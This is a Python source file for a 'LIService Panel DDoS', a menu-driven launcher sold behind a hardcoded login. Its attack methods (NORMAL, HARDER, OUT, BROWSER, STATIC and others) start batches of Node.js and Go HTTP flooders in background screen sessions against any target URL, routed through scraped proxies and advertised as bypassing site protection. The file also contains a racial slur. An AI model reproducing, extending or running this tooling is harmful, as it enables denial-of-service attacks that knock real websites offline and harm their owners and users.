import os
import sys
import getpass

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def logo():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO LISERVICE PANEL DDOS | DEVELOPMENT BY t.me/Lintar21 | MAIN MENU \x07")
	print(""" 

                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝ 
              ╚══════════════════════════════════════════════╝

 """)
def methods():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO LISERVICE PANEL DDOS | DEVELOPMENT BY t.me/Lintar21 | LIST METHODS \x07")
	print("""
                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝ 
              ╚══════════════════════════════════════════════╝

 • NORMAL | Suitable for regular sites | Layer7
 • MEDIUM | Usually sites with continuous protection are used | Layer7
 • HARDER | Big request. Suitable for big site attacks | Layer7
 • BROWSER| Browser flooder [Beta] | Layer7
 • STATIC | Good for bypass statics sites [Beta] | Layer7
 • OUT     | High Rps and combined bypass. Can make your server lag | Layer7
 • SHOW   | For showing power on dstat only | Layer7
 • PROXY  | Proxies grab Or proxies scrape | Tools
 • STOP   | Stoping all attack | Tools
 • CREDIT | Credits panel D.D.o.S | Tools
 • SETUP  | Setup panel ddos| Tools 

""")

def main():
    logo()
    while(True):
        cnc = input('''Panel•DDoS[LIService]-> ''')
        if cnc == "Methods" or cnc == "methods" or cnc == "METHOD" or cnc == "METHODS":
            methods()
        elif cnc == "Clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "HELP" or cnc == "help" or cnc == "Help" or cnc == "HLP":
            methods()
        elif cnc == "stop" or cnc == "STOP" or cnc == "Stop" or cnc == "stp":
            os.system("pkill screen")
            print("Stops All Attacks ")
        elif cnc == "setup" or cnc == "Setup" or cnc == "SETUP" or cnc == "SET":
            os.system("python3 installer.py")
            print("Done")
        elif cnc == "stop" or cnc == "STOP" or cnc == "Stop" or cnc == "stp":
        	print(""" 

                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝ 
              ╚══════════════════════════════════════════════╝


LIService Panel DDoS Credits
Create By @Lintar21 

Telegram: t.me/Lintar21
 """)

        elif "SHOW" in cnc:
            try:
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node LIService-Destroyer.js GET {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-Flooding.js GET {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS.js {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS-2.js {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS-Z.js {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-Raw.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-Method.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-TLS.js {host} {time} 8 4 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                print(f""" 
            █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
            █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
     ╚╦═════════════════════════════════════════════╦╝
   ╔══╩═════════════════════════════════════════════╩═══╗
    LIService Panel DDoS | Development By t.me/LIService 
   ╚══╦══════════════════════════════════════════════╦══╝
      ╚══════════════════════════════════════════════╝
      
[System] Attack Information 
Target: {host}
Time: {time}s
Method: SHOW
Type [CLS] to clear the terminal 
""")
            except IndexError:
                print('Usage: SHOW <url> <time>')
                print('Example: SHOW http://example.com 60')

        elif "NORMAL" in cnc:
            try:
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node LIService-Raw.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-Method.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-Destroyer.js GET {host} {time} 8 4 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                print(f""" 
            █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
            █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
     ╚╦═════════════════════════════════════════════╦╝
   ╔══╩═════════════════════════════════════════════╩═══╗
    LIService Panel DDoS | Development By t.me/LIService 
   ╚══╦══════════════════════════════════════════════╦══╝
      ╚══════════════════════════════════════════════╝
      
[System] Attack Information 
Target: {host}
Time: {time}s
Method: SHOW
Type [CLS] to clear the terminal 
""")
            except IndexError:
                print('Usage: SHOW <url> <time>')
                print('Example: SHOW http://example.com 60')

        elif "MEDIUM" in cnc:   	
            try:
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node LIService-Raw.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-Method.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-X.js {host} {time} 8 4 proxy.txt ipv4')
                os.system(f'cd Layer7 && screen -dm node LIService-Destroyer.js GET {host} {time} 8 4 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                print(f""" 
            █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
            █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
     ╚╦═════════════════════════════════════════════╦╝
   ╔══╩═════════════════════════════════════════════╩═══╗
    LIService Panel DDoS | Development By t.me/LIService 
   ╚══╦══════════════════════════════════════════════╦══╝
      ╚══════════════════════════════════════════════╝
      
[System] Attack Information 
Target: {host}
Time: {time}s
Method: MEDIUM
Type [CLS] to clear the terminal 
""")
            except IndexError:
                print('Usage: MEDIUM <url> <time>')
                print('Example: MEDIUM http://example.com 60')

        elif "HARDER" in cnc:
            try:
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node LIService-Destroyer.js GET {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-Flooding.js GET {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS.js {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS-2.js {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS-Z.js {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-Raw.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-Method.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-TLS.js {host} {time} 8 4 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                print(f""" 
            █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
            █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
     ╚╦═════════════════════════════════════════════╦╝
   ╔══╩═════════════════════════════════════════════╩═══╗
    LIService Panel DDoS | Development By t.me/LIService 
   ╚══╦══════════════════════════════════════════════╦══╝
      ╚══════════════════════════════════════════════╝
      
[System] Attack Information 
Target: {host}
Time: {time}s
Method: HARDER
Type [CLS] to clear the terminal 
""")
            except IndexError:
                print('Usage: HARDER <url> <time>')
                print('Example: HARDER http://example.com 60')

        elif "OUT" in cnc:
            try:
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm go run LIService-Golang-Flood.go {host} 64 GET {time} nil')
                os.system(f'cd Layer7 && screen -dm go run LIService-Golang-Flood.go {host} 64 POST {time} nil')
                os.system(f'cd Layer7 && screen -dm node LIService-Destroyer.js GET {host} {time} 512 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-Destroyer.js POST {host} {time} 512 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-Flooding.js GET {host} {time} 512 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-Flooding.js POST {host} {time} 512 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS.js {host} {time} 512 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS-2.js {host} {time} 512 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS-Z.js {host} {time} 512 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-Raw.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-Method.js {host} {time}')
                os.system(f'cd Layer7 && screen -dm node LIService-HTTPS-3.js {host} {time} 512 64 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-HTX-2.js {host} {time} 8 4 proxy.txt')
                os.system(f'cd Layer7 && screen -dm node LIService-X.js {host} {time} 512 64 proxy.txt ipv4')
                os.system(f'cd Layer7 && screen -dm node LIService-TLS.js {host} {time} 512 64 proxy.txt')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                print(f""" 
            █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
            █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
     ╚╦═════════════════════════════════════════════╦╝
   ╔══╩═════════════════════════════════════════════╩═══╗
    LIService Panel DDoS | Development By t.me/LIService 
   ╚══╦══════════════════════════════════════════════╦══╝
      ╚══════════════════════════════════════════════╝
      
[System] Attack Information 
Target: {host}
Time: {time}s
Method: HARDER
Type [CLS] to clear the terminal 
""")
            except IndexError:
                print('Usage: HARDER <url> <time>')
                print('Example: HARDER http://example.com 60')
                

        elif "BROWSER" in cnc:
            try:
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node LIService-Browser.js {host} 7 proxy_browser.txt 64 60 {time} true')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                print(f""" 
            █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
            █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
     ╚╦═════════════════════════════════════════════╦╝
   ╔══╩═════════════════════════════════════════════╩═══╗
    LIService Panel DDoS | Development By t.me/LIService 
   ╚══╦══════════════════════════════════════════════╦══╝
      ╚══════════════════════════════════════════════╝
      
[System] Attack Information 
Target: {host}
Time: {time}s
Method: BROWSER
Type [CLS] to clear the terminal 
""")
            except IndexError:
                print('Usage: BROWSER <url> <time>')
                print('Example: BROWSER http://example.com 60')

        elif "STATIC" in cnc:
            try:
                host = cnc.split()[1]
                time = cnc.split()[2]
                os.system("clear")
                os.system(f'cd Layer7 && screen -dm node LIService-Browser.js {host} 7 proxy_browser.txt 64 60 {time} true --fin ')
                os.system(f'cd Layer7 && screen -dm node LIService-Browser.js {host} 7 proxy_browser.txt 64 60 {time} true --static')
                sys.stdout.write(f"\x1b]2; LISERVICE PANEL DDOS BY t.me/Lintar21 | Sent Attack\x07")
                print(f""" 
            █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
            █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
     ╚╦═════════════════════════════════════════════╦╝
   ╔══╩═════════════════════════════════════════════╩═══╗
    LIService Panel DDoS | Development By t.me/LIService 
   ╚══╦══════════════════════════════════════════════╦══╝
      ╚══════════════════════════════════════════════╝
      
[System] Attack Information 
Target: {host}
Time: {time}s
Method: STATIC
Type [CLS] to clear the terminal 
""")
            except IndexError:
                print('Usage: STATIC <url> <time>')
                print('Example: STATIC http://example.com 60')
                
        elif "PROXY" in cnc:
            try:
                os.system(f'cd Layer7 && python3 LIService-Scrape.py')
                os.system(f'cd Layer7 && screen -dm python3 LIService-Scrape-Browser.py')          
            except IndexError:
                print('Usage: PROXY')
                print('Example: PROXY')
                
        elif "Niga" in cnc:
            print(f'''
Are you niga?
            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
            except IndexError:
                pass

def login():
    clear()
    user = "root"
    passwd = "Buyer"
    username = input("""
                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            LIService Panel DDoS | Development By t.me/LIService 
           ╚══╦══════════════════════════════════════════════╦══╝
              ╚══════════════════════════════════════════════╝
              
Username: """)
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password/username you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to LIService Bro")
        clear()
        main()

login()